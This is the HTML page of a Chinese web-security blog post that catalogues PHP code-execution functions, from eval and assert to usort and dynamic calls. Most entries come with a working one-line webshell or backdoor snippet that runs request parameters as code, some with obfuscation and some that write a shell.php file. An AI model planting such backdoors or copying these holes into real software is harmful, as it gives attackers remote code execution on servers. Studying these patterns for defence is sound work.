@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="幻心">
+
+
+
+
+
+<title>代码执行 | 幻心&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">幻心&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">幻心&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">代码执行</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">幻心</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 20, 2020&nbsp;&nbsp;20:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。</p>
+<p>　　常见代码执行函数，如  </p>
+<p>　　　　eval()、assert()、preg_replace()、create_function()</p>
+<p>　　　　array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()</p>
+<p>　　　　文件操作函数、动态函数（$a($b)）</p>
+<p><strong>1、eval()</strong> </p>
+<p>　　eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：<?php eval($_POST[cmd])?></p>
+<p><strong>2、assert()</strong></p>
+<p>　　 与eval类似，字符串被 assert() 当做 PHP 代码来执行，如：</p>
+<p>示例代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">assert($_REQUEST[cmd]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、preg_replace()</strong></p>
+<p>　　mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p>
+<p>　　搜索subject中匹配pattern的部分， 以replacement进行替换。</p>
+<p>　　preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
+<p>示例代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4、create_function()</strong></p>
+<p>　　create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo();</span><br><span class="line">$func =create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">$func();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：</p>
+<p>代码安全：PHP create_function()注入命令执行漏洞</p>
+<p><a target="_blank" rel="noopener" href="http://www.cnseay.com/1901/">http://www.cnseay.com/1901/</a></p>
+<p><a target="_blank" rel="noopener" href="http://lovexm.blog.51cto.com/3567383/1743442">http://lovexm.blog.51cto.com/3567383/1743442</a></p>
+<p><a target="_blank" rel="noopener" href="http://qqhack8.blog.163.com/blog/static/11414798520153795157139/">http://qqhack8.blog.163.com/blog/static/11414798520153795157139/</a></p>
+<p><strong>5、array_map()</strong></p>
+<p>　　array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
+<p> 代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//?func=system&amp;cmd=whoami</span><br><span class="line">$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line">//print_r($new_array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>6、call_user_func()/call_user_func_array ()</strong></p>
+<p>　　call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数。</p>
+<p>　　call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">@call_user_func(assert,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">call_user_func_array(&quot;assert&quot;,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>7、array_filter()</strong></p>
+<p>　　array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) </p>
+<p>　　依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?func=system&amp;cmd=whoami</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array1=array($cmd);</span><br><span class="line">$func =$_GET[&#x27;func&#x27;];</span><br><span class="line">array_filter($array1,$func);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>8、usort()、uasort()</strong></p>
+<p>　　usort() 通过用户自定义的比较函数对数组进行排序。</p>
+<p>　　uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php环境&gt;=5.6才能用</span><br><span class="line">&lt;?php usort(...$_GET);?&gt;</span><br><span class="line">利用方式：</span><br><span class="line">test.php?1[]=1-1&amp;1[]=eval($_POST[&#x27;x&#x27;])&amp;2=assert</span><br><span class="line">[POST]:x=phpinfo();</span><br><span class="line"></span><br><span class="line">php环境&gt;=&lt;5.6才能用</span><br><span class="line">&lt;?php usort($_GET,&#x27;asse&#x27;.&#x27;rt&#x27;);?&gt;</span><br><span class="line">利用方式：</span><br><span class="line">test.php?1=1+1&amp;2=eval($_POST[x])</span><br><span class="line">[POST]:x=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><strong>9、文件操作函数</strong></p>
+<p>　　file_put_contents() 函数把一个字符串写入文件中。</p>
+<p>　　fputs() 函数写入文件</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$test=&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;</span><br><span class="line">file_put_contents(&#x27;test1.php&#x27;,$test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <strong>10、动态函数</strong></p>
+<p>　　PHP函数直接由字符串拼接</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//?a=assert&amp;b=phpinfo()</span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>幻心</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://huanxinhack.github.io/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://huanxinhack.github.io/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"># 命令执行</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/mysql-udf%E6%8F%90%E6%9D%83/">MySQL UDF提权</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 幻心 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
